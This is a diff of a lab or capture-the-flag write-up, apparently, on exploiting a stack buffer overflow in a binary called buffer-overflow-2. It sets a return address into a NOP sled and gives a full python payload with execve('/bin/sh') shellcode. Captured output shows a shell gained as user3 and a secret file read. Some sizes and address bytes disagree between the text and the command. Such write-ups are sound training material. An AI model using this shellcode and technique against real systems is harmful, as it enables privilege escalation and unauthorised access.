@@ -1658,11 +1658,24 @@ root@ip-10-66-67-9:~#
 
 ### Return Address
 
-The malicious return address points to a memory address after 0x7fffffffe210 (rbp minus 160) but before the shell code. We will use 0x7fffffffe210 plus 32 or 0x7fffffffe230.
+The malicious return address points to a memory address after 0x7fffffffe210 (rbp minus 160) but before the shell code. We will use 0x7fffffffe2a8, something far into the nop sled.
 
-This must be converted to little Endian to become '\x30\xe2\xff\xff\xff\xff\xff\x7f'
+This must be converted to little Endian to become '\xa8\xe2\xff\xff\xff\xff\xff\x7f'
 
 ### 168 byte Payload  
 
 
-`:> ./buffer-overflow-2 $(python -c "print('\x90'*100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05'+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90' * (168-54-100) + '\x30\xe2\xff\xff\xff\xff\xff\x7f')")`  
+`:> ./buffer-overflow-2 $(python -c "print('\x90'*100 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90' * (163-54-100) + '\xa8\xe2\xff\xff\xff\x7f')")`  
+
+```md
+[user1@ip-10-64-133-50 overflow-4]$ ./buffer-overflow-2 $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x41' * (163-54-90) + '\xa8\xe2\xff\xff\xff\x7f')")
+new word is doggo\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdAAAAAAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\ufffd
+sh-4.2$ whoami
+user3
+sh-4.2$ ls
+buffer-overflow-2  buffer-overflow-2.c	secret.txt
+sh-4.2$ cat secret.txt
+wowanothertime!!
+sh-4.2$ 
+
+```
